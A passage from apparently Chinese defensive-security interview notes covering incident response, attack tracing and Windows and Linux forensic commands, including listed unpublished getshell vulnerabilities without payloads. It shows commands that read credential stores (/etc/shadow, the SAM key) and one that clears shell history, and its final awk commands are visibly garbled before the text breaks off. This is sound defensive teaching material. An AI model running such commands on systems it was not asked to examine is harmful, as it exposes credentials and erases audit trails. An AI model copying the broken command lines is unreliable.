<p>告警研判的结果和对应措施也可以用下表直观地展示出来：</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/t01610b78a41d1dca49.jpg" alt="img"></p>
<p><strong>2. 攻击事件调查</strong></p>
<p>一旦确定了告警的真实性，要通过主机、流量侧的日志以及系统告警等信息，对攻击事件进行调查。并根据攻击行为特征建立一套通用的方法论，生成《XXX 事件调查报告》。根据这套方法论在自己的安全设备中添加检测规则，以便在下次面对相同攻击的时候快速做出响应。</p>
<p>在这个过程中，请参阅以下关键问题以全面了解攻击事件：</p>
<p>・最初的攻击媒介是什么？ （即，攻击方如何获得对网络的初始访问权限？）</p>
<p>・攻击方如何访问环境？</p>
<p>・攻击方是否利用漏洞来获得访问权或特权？</p>
<p>・攻击方如何维持指挥和控制？</p>
<p>・攻击方在网络或设备上是否有持久性？</p>
<p>・持久性的方法是什么（例如，恶意软件后门、webshell、合法凭证、远程工具等）？</p>
<p>・哪些帐户已被盗用，这些账户是什么权限级别（例如，域管理员、本地管理员、用户帐户等）？</p>
<p>・使用什么方法进行侦察？</p>
<p>・是否发生横向移动？ 如何进行横向移动（例如，RDP、网络共享、恶意软件等）？</p>
<p>・数据是否被泄露，如果有，是什么类型的，通过什么机制？</p>
<p><strong>3. 失陷范围排查</strong></p>
<p>安全事件发生时，对于横向移动主机，首先会根据现有信息找出一台确认失陷的主机，然后以这台失陷主机的数据以及它的互联关系为线索，在用户系统中展开内网溯源，确认是否存在被横向渗透的主机，并循环此过程逐步找出所有失陷主机，确认攻击影响面及具体的失陷范围。</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/t01f3868fc0e25f591b.jpg" alt="img"></p>
<p><strong>4. 攻击过程还原</strong></p>
<p>攻击溯源是事件响应的关键，也是安全能力提升的关键。通过对被攻击资产的分析与溯源，还原攻击路径与攻击手法，用户不仅能够有效提升攻防演练效果，还可增强常态化安全防御能力，将攻击事件转换为防御势能，避免二次攻击事件的发生。</p>
<p><strong>5. 防守方成果报告整理</strong></p>
<p>在攻防演练中，防守方在完成攻击确认到调查、还原的整个流程之后，需要整理出一份防守报告，阐述攻击的真实性、攻击的覆盖范围、攻击者的攻击路径及行为。并将报告提交给组织方，即可得分。</p>
<p><strong>6. 攻击清除处置建议</strong></p>
<p>最后，根据对攻击者所用技术和攻击路径的反向梳理结果，安全团队要综合分析对方的攻击动机和意图，以及用户自身的防护水平及目的，给出合理的处置建议。</p>
<p>以上 6 个步骤是在攻防演练或日常防护中所要实施的攻击研判流程，不同企业的攻击研判服务都大致如此。但虽然流程基本一致，不同企业组织的攻击研判质量却参差不齐，究其原因，在于研判模式的区别。</p>
<h3 id="问十五：去年爆出了哪些漏洞？"><a href="#问十五：去年爆出了哪些漏洞？" class="headerlink" title="问十五：去年爆出了哪些漏洞？"></a>问十五：去年爆出了哪些漏洞？</h3><p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/1657005291550.png" alt="1657005291550"></p>
<p>漏洞汇总地址：<a href="https://www.hedysx.com/2756.html" target="_blank" rel="noopener">https://www.hedysx.com/2756.html</a></p>
<h3 id="问十六：去年有哪些已证实的漏洞"><a href="#问十六：去年有哪些已证实的漏洞" class="headerlink" title="问十六：去年有哪些已证实的漏洞"></a>问十六：去年有哪些已证实的漏洞</h3><p><strong>漏洞编号：B-T-V-0052</strong> 漏洞名称：金蝶天燕 v9.0 版本消息中间件 getshell 涉及厂商：金蝶 漏洞等级：高危 是否公开：否 是否有 POC：是 首次发现时间：2021 年 4 月 10 日 情报来源：互联网</p>
<p><strong>防护建议：</strong> 奇安信天眼 规则 ID：0x10020D4C 版本号：3.0.0411.12748 奇安信安域 Web 应用防护系统 规则 ID：181260001 版本号：20210411003 奇安信网神网络数据传感器 规则 ID：6366 版本号：2104111822 奇安信网神智慧防火墙 规则 id：1240701 版本号：2104112000 及以上版本 奇安信网神云锁服务器安全管理系统 RASP 版本：2.0.18 Agent 版本号：V8.0.2.112</p>
<p><strong>漏洞编号：B-T-V-0058</strong> 漏洞名称：蓝凌 oa 高版本 前台未授权 getshell 涉及厂商：蓝凌 漏洞等级：高危 是否公开：否 是否有 POC：是 首次发现时间：2021 年 4 月 11 日 情报来源：互联网</p>
<p><strong>防护建议：</strong> 奇安信天眼 规则 id：0x10020D42 版本号：3.0.0411.12748 奇安信安域 Web 应用防护系统 规则 ID：181230002 版本号：20210411002 奇安信网神网络数据传感器 规则 ID：6357 版本号：2104111822 奇安信网神智慧防火墙 规则 id：1240601 版本号：2104112000 及以上版本 虚拟化安全管理平台 windows 版 规则 id:2923983 版本号：2021.04.14 虚拟化安全管理平台 linux 版 规则 id:313826 版本号：2021.04.14 奇安信网神智慧防火墙 规则 id：1238801 版本号：2104112000 及以上版本 奇安信网神统一服务器安全管理平台 规则 Id:63823983 版本号：10352</p>
<h1 id="二、应急、溯源和反制"><a href="#二、应急、溯源和反制" class="headerlink" title="二、应急、溯源和反制"></a>二、应急、溯源和反制</h1><h3 id="问十七：简述一下应急响应的流程？"><a href="#问十七：简述一下应急响应的流程？" class="headerlink" title="问十七：简述一下应急响应的流程？"></a>问十七：简述一下应急响应的流程？</h3><p>准备 - 检测 - 抑制 - 根除 - 恢复 - 书写报告 </p>
<p>1、准备工作，收集信息：收集告警信息、客户反馈信息、设备主机信息等。 </p>
<p>2、检测，判断类型：安全事件类型的判断（钓鱼邮件，webshell，爆破，中毒等） </p>
<p>3、抑制，控制范围，隔离失陷设备 </p>
<p>4、根除，分析研判，将收集的信息分析 </p>
<p>5、恢复，处置事件类型（进程、文件、邮件、启动项，注册表等） </p>
<p>6、输出报告</p>
<ul>
<li><p>第一步，安全感知平台查看事件预警，分析预警是否误报</p>
<p>误报，忽略；非误报，进行分析</p>
</li>
<li><p>第二步，从安全按感知平台，安全设备，对攻击事件进行分析</p>
<p>不成功，封禁 IP；成功，开启应急响应排查流程</p>
</li>
<li><p>第三步，应急响应</p>
<p>被上传 shell、网页被篡改、网页被加黑链：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、D盾扫找到最早shell，记录上传时间，备份shell并删除</span><br><span class="line">2、根据该shell在各类日志中找到恶意ip，并过滤出该ip的所有日志</span><br><span class="line">3、根据webshell生成时间找到该时间点的POST日志确认webshell生成方法</span><br><span class="line">4、继续向上溯源分析IP攻击路径以及可能利用的漏洞，重点关注POST日志，以及存在如upload、editor、admin、manage、sql等敏感字段的日志，同时分析网站用到的中间件或者框架，分析其中可能的漏洞</span><br><span class="line">5、修复攻击者使用的漏洞，</span><br></pre></td></tr></table></figure>
</li>
<li><p>第四步，开始系统排查</p>
</li>
</ul>
<ol>
<li>启动项</li>
</ol>
<p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p>
<p>启动项的文件夹，排查是否有可疑的程序。</p>
<ol>
<li>计划任务</li>
</ol>
<p>C:\Windows\System32\Tasks\</p>
<p>C:\Windows\SysWOW64\Tasks\</p>
<p>C:\Windows\tasks\</p>
<p>排查是否有恶意计划任务自动运行。</p>
<ol>
<li>系统用户</li>
</ol>
<p>排查是否有多余的可疑账户，问题：2. 了解隐藏账户</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/Lcct6f.jpg" alt="img"></p>
<p>难免会碰到一些应急场景，这里推荐 GitHub 上一个大佬的应急工具箱，整合了诸多的分析文章和常见工具，应急工具箱：[<a href="https://github.com/No-Github/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md">https://github.com/No-Github/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md</a>]</p>
<h3 id="问十八：入侵排查基本流程是什么？"><a href="#问十八：入侵排查基本流程是什么？" class="headerlink" title="问十八：入侵排查基本流程是什么？"></a>问十八：入侵排查基本流程是什么？</h3><p>宏观思路</p>
<ol>
<li>收集信息：收集客户信息和中毒主机信息，包括样本</li>
<li>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等</li>
<li>抑制范围：隔离使受害⾯不继续扩⼤</li>
<li>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源</li>
<li>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产</li>
<li>产出报告：整理并输出完整的安全事件报告</li>
</ol>
<h3 id="问十九：Winodws-系统应急排查思路？"><a href="#问十九：Winodws-系统应急排查思路？" class="headerlink" title="问十九：Winodws 系统应急排查思路？"></a>问十九：Winodws 系统应急排查思路？</h3><p>系统信息、系统帐号、注册表、账户信息、系统会话、检查日志、网卡信息</p>
<ul>
<li><p>系统信息</p>
<ul>
<li><p>查看系统版本以及补丁信息：<code>systeminfo</code></p>
</li>
<li><p>查看可疑目录及 (隐藏) 文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Window 2003&#96;：&#96;C:\Documents and Settings</span><br><span class="line">Window 20008R2：C:\Users\</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>查看最近运行的文件：</p>
<p>cmd 运行 <code>%UserProfile%\Recent</code></p>
<p><code>Recent</code> 是系统文件夹，里面存放了最近使用的文档的快捷方式。</p>
</li>
<li><p>查看可以文件的日期和文件信息</p>
</li>
</ul>
<p>系统帐号</p>
<p>查看所有帐号方法：</p>
<ul>
<li><p>打开本地用户和组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compmgmt.msc</span><br><span class="line">或</span><br><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>使用命令行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user </span><br><span class="line">wmic useraccount </span><br><span class="line">wmic useraccount list brief</span><br></pre></td></tr></table></figure>
<p>查看注册表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure>
<p>显示某个用户账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user [SOMEONE]</span><br></pre></td></tr></table></figure>
<ul>
<li><p>系统会话</p>
<ul>
<li>查看当前系统会话：<code>query user</code></li>
<li>下线用户：<code>logoff [id]</code></li>
</ul>
</li>
<li><p>检查日志</p>
<p>结合日志，查看管理员登陆操作，用户异常操作：<code>eventvwr.msc</code>，保存日志使用 LogParser 进行分析。</p>
</li>
<li><p>网卡信息</p>
<ul>
<li><p>列出所有网络驱动程序列表：<code>wmic nicconfig list</code></p>
</li>
<li><p>列出所有 IP 接口列表：<code>wmic nicconfig where IPEnabled=&#39;true&#39;</code></p>
</li>
<li><p>更新静态 IP：<code>wmic nicconfig where index=9 call enablestatic(&quot;192.168.123.66&quot;), (&quot;255.255.255.0&quot;)</code></p>
</li>
<li><p>更新网关：<code>wmic nicconfig where index=9 call setgateways(&quot;192.168.123.4&quot;), (&quot;255.255.255.0&quot;),(1,2)</code></p>
</li>
<li><p>DHCP 设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#启动</span><br><span class="line">wmic nicconfig where index&#x3D;9 call enabledhcp </span><br><span class="line">#设置DHCP状态</span><br><span class="line">wmic service where caption&#x3D;&quot;DHCP Client&quot; call changestartmode &quot;Disabled&quot;</span><br><span class="line">wmic service where caption&#x3D;&quot;DHCP Client&quot; call changestartmode &quot;Automatic&quot;</span><br><span class="line">wmic service where caption&#x3D;&quot;DHCP Client&quot; call changestartmode &quot;Manual&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p><strong>进程和端口相关</strong></p>
<p>进程、端口、程序位置、程序命令行参数</p>
<ul>
<li><p>进程</p>
<p>可以使用任务管理器查看进程</p>
<ul>
<li><p>方法一：开始 —&gt; 运行 —&gt; <code>msinfo32</code> —&gt; 软件环境 —&gt; 正在运行任务</p>
<p>（能查看进程的详细信息） 查看端口对应的 PID：<code>netstat -ano | findstr &quot;[PORT]&quot;</code></p>
</li>
<li><p>方法二：命令行查看进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic process</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic process list full</span><br><span class="line">wmic process list system</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>以 xml 格式存储：<code>wmic /record:processes.xml process list full</code></p>
</li>
</ul>
<p>端口</p>
<ul>
<li><p>查看端口：<code>netstat -ano</code></p>
<p>查看网络连接：<code>netstat -ano | find ESTABLISHED</code></p>
<p>| 状态        | 说明                                   |<br>| —————- | ——————————————————— |<br>| Listen      | 监听状态                               |<br>| ESTABLISHED | 建立连接                               |<br>| CLOSE_WAIT  | 对方主动关闭连接或网络异常导致连接中断 |</p>
</li>
<li><p>根据显示的 PID 定位程序：<code>tasklist | findstr [PID]</code></p>
<p>查看 <code>Windows</code> 服务对应的端口：<code>%system%/system32/drivers/etc/services</code>（一般 % system% 就是 C:\Windows）。</p>
</li>
</ul>
<p>程序位置</p>
<ul>
<li><p>查看进程对应的程序位置</p>
<p>任务管理器 —&gt; 选择对应进程 —&gt; 右键打开文件位置</p>
<p>运行输入 <code>wmic</code>：<code>process</code></p>
</li>
<li><p>根据进程 PID 查找具体启动的程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process get name,executablepath,processid | findstr pid</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>程序命令行参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get caption,commandline &#x2F;value</span><br></pre></td></tr></table></figure>
<p>查询某一进程的命令行参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where caption&#x3D;&quot;svchost.exe&quot; get caption,commandline &#x2F;value</span><br></pre></td></tr></table></figure>
<p><strong>服务和计划任务</strong></p>
<p>启动项检查、服务检查</p>
<ul>
<li><p>启动项检查</p>
<ul>
<li><p>查看启动项：<code>msconfig</code></p>
</li>
<li><p>查看注册表启动项：</p>
</li>
<li><p>运行 —&gt; <code>regedit</code> —&gt; 打开注册表，查看开机启动项是否正常，三个特别的注册表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run </span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>组策略下查看启动项：</p>
<p>运行 —&gt; <code>gpedit.msc</code>(组策略) —&gt; 计算机配置 —&gt; <code>Windows</code> 设置 —&gt; 脚本（启动 / 关机） —&gt; 启动 —&gt; 属性</p>
<p>命令行 <code>wmic</code> 查看启动列表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic startup</span><br><span class="line">wmic startup list full</span><br><span class="line">wmic startup list brief</span><br><span class="line">wmic startup list system</span><br></pre></td></tr></table></figure>
<ul>
<li>服务检查<ul>
<li>检查服务自启动：services.msc`</li>
<li>查询正在运行的服务：<code>sc query type=service</code></li>
<li>查询存在但是没运行的服务：<code>sc query type=service state=inactive</code></li>
<li>查询所有服务：<code>sc query type=service state=all</code></li>
</ul>
</li>
</ul>
<p><strong>日志分析、审核策略</strong></p>
<p>日志分类、审核策略、日志分析工具</p>
<ul>
<li><p>日志分类</p>
<ul>
<li><p>系统日志</p>
<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。  </p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<ul>
<li><p>查看方法：</p>
<ol>
<li>开始 —&gt; 所有程序 —&gt; 管理工具 —&gt; 事件查看器</li>
<li>运行 —&gt; <code>eventvwr.msc</code></li>
</ol>
</li>
<li><p><code>Windows</code> 事件日志分析，不同的 <code>EVENT ID</code> 代表了不同的意义。</p>
<p>| 事件 ID | 说明                             |<br>| ———- | ———————————————— |<br>| 4624    | 登录成功                         |<br>| 4625    | 登录失败                         |<br>| 4634    | 注销成功                         |<br>| 4647    | 用户启动的注销                   |<br>| 4672    | 使用超级用户（如管理员）进行登录 |<br>| 4720    | 创建用户                         |</p>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<p>| 登录类型 | 描述                            | 说明                                             |<br>| ———— | ———————————————- | ———————————————————————— |<br>| 2        | 交互式登录（Interactive）       | 用户在本地进行登录。                             |<br>| 3        | 网络（Network）                 | 最常见的情况就是连接到共享文件夹或共享打印机时。 |<br>| 4        | 批处理（Batch）                 | 通常表明某计划任务启动。                         |<br>| 5        | 服务（Service）                 | 每种服务都被配置在某个特定的用户账号下运行。     |<br>| 7        | 解锁（Unlock）                  | 屏保解锁。                                       |<br>| 8        | 网络明文（NetworkCleartext）    | 登录的密码在网络上是通过明文传输的，如 FTP。     |<br>| 9        | 新凭证（NewCredentials）        | 使用带 / Netonly 参数的 RUNAS 命令运行一个程序。 |<br>| 10       | 远程交互，（RemoteInteractive） | 通过终端服务、远程桌面或远程协助访问计算机。     |<br>| 11       | 缓存交互（CachedInteractive）   | 以一个域用户登录而又没有域控制器可用             |</p>
</li>
</ul>
</li>
<li><p>安全日志</p>
<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 </p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>  </p>
</li>
<li><p>应用程序日志</p>
<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
</li>
</ul>
</li>
<li><p>审核策略</p>
<p>审核策略开启后可以查看系统出现故障、安全事故等系统日志文件，帮助排除故障，追查入侵者的信息等。</p>
<ul>
<li><p>开启审核策略</p>
<p>开始 —&gt; 管理工具 —&gt; 本地安全策略 —&gt; 本地策略 —&gt; 审核策略 配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">审核账户管理|||成功,失败</span><br><span class="line">审核账户登录事件||成功,失败</span><br><span class="line">审核系统事件||||成功,失败</span><br><span class="line">审核特权使用|||失败</span><br><span class="line">审核目录服务访问||失败</span><br><span class="line">审核进程跟踪|||成功,失败</span><br><span class="line">审核对象访问|||失败</span><br><span class="line">审核登录事件|||成功,失败</span><br><span class="line">审核策略更改|||成功,失败</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>配置日志属性</p>
<p>开始 —&gt; 所有程序 —&gt; 管理工具 —&gt; 事件查看器 —&gt; Windows 日志 —&gt; 应用程序 —&gt; 右键属性 —&gt; 启用日志最大大小</p>
</li>
</ul>
<p>日志分析工具（LogParser）</p>
<p>日志解析器是微软开发的一个强大的多功能工具，它提供对基于文本的数据（例如日志文件、XML 文件和 CSV 文件）以及 Windows® 操作系统上的关键数据源（例如事件日志、注册表、文件系统和 Active Directory。  </p>
<p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a>  </p>
<p>下载完毕安装后，将其中的文件 LogParser.exe 复制到 C:\Windows\System32 文件夹中或者添加到系统环境变量中。</p>
<ul>
<li><p>查询登陆成功的事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID&#x3D;4624&quot;</span><br><span class="line"># 指定登录时间范围的事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#39;2018-06-19 23:32:11&#39; and TimeGenerated&lt;&#39;2018-06-20 23:34:00&#39; and EventID&#x3D;4624&quot;</span><br><span class="line"># 提取登录成功的用户名和IP</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM c:\Security.evtx where EventID&#x3D;4624&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>查询登陆失败的事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 登录失败的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID&#x3D;4625&quot;</span><br><span class="line"># 提取登录失败用户名进行聚合统计</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#39; &#39;)  as EventType,EXTRACT_TOKEN(Message,19,&#39; &#39;) as user,count(EXTRACT_TOKEN(Message,19,&#39; &#39;)) as Times,EXTRACT_TOKEN(Message,39,&#39; &#39;) as Loginip FROM c:\Security.evtx where EventID&#x3D;4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure>
<p>查询系统历史开关机记录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006&quot;</span><br></pre></td></tr></table></figure>
<p><strong>相关工具</strong></p>
<p>PCHunter：PC Hunter 是一个 Windows 系统信息查看软件，同时也是一个手工杀毒辅助软件。</p>
<p>下载地址：<a href="https://www.anxinsec.com/view/antirootkit/" target="_blank" rel="noopener">https://www.anxinsec.com/view/antirootkit/</a></p>
<h3 id="问二十：Linux-系统应急排查"><a href="#问二十：Linux-系统应急排查" class="headerlink" title="问二十：Linux 系统应急排查"></a>问二十：Linux 系统应急排查</h3><p>Linux 系统信息</p>
<p>启动项、定时任务和历史命令、系统用户、入侵排查</p>
<ul>
<li><p>启动项</p>
<ul>
<li><p>系统运行级别</p>
<p>| 运行级别 | 含义                                                         |<br>| ———— | —————————————————————————————— |<br>| 0        | 关机                                                         |<br>| 1        | 单用户模式，可以理解为 winodws 的安全模式，用于系统修复，比如更改密码 |<br>| 2        | 不完全的命令行模式，不包含 NFS 等服务                        |<br>| 3        | 完全的命令行模式，就是标准字符界面                           |<br>| 4        | 系统保留                                                     |<br>| 5        | 图形模式                                                     |<br>| 6        | 重启                                                         |</p>
<p>查看系统运行级别：<code>runlevel</code> </p>
<p>修改系统默认运行级别：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/inittab</span><br><span class="line">id=3: initdefault</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>开机启动配置</p>
<p>在 CentOS 中，init 程序会读取 /etc/inittab 来完成初始化工作，<code>/etc/inittab</code> 主要指定运行级别，执行系统初始化脚本 <code>/etc/rc.d/rc.sysinit</code>。</p>
<p>开机启动配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;init.d</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure>
<ul>
<li><p>添加开机启动脚本</p>
<p>要开机启动对应的脚本，只需要将可执行脚本丢在 <code>/etc/init.d/</code> 目录下，然后 <code>/etc/rc.d/rc*.d</code> 中建立软链接即可：<code>ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></p>
<p><code>S</code> 开头代表加载时自启动；如果是 <code>K</code> 开头的脚本文件，代表运行级别加载时需要关闭的。</p>
</li>
<li><p>定时任务和历史命令</p>
<ul>
<li><p>定时任务</p>
<p>以下目录是否存在恶意脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>历史命令</p>
<p>通过<code>.bash_history</code> 查看账号执行过的系统命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">history</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ more .bash_history</span><br></pre></td></tr></table></figure>
<ul>
<li><p>清除历史命令：<code>history -c</code></p>
</li>
<li><p>系统用户</p>
<ul>
<li><p>用户信息</p>
<p>用户信息文件 <code>/etc/passwd</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ root:x:0:0:root:/root:/bin/bash</span><br><span class="line">$ account:password:UID:GID:GECOS:directory:shell</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>影子账户 <code>/etc/shadow</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ root:<span class="variable">$6</span><span class="variable">$oGs1PqhL2p3ZetrE</span><span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
<ul>
<li><ul>
<li><p><code>who</code>：查看当前登录用户 (<code>tty</code> 本地登录，<code>pts</code> 远程登录)</p>
<p><code>w</code>：查看系统信息</p>
<p><code>uptime</code>：查看登录多久、多少用户</p>
</li>
</ul>
</li>
<li><p>入侵排查</p>
<ul>
<li>查看启动项文件：<code>more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</code></li>
</ul>
</li>
<li><p>查询特权用户：<code>awk -F: &#39;c194a9eg1}&#39; /etc/passwd</code></p>
</li>
<li><p>查询可疑远程登录的账号信息：`awk ‘/$1|$6/{print c194a9eg</p>
</li>
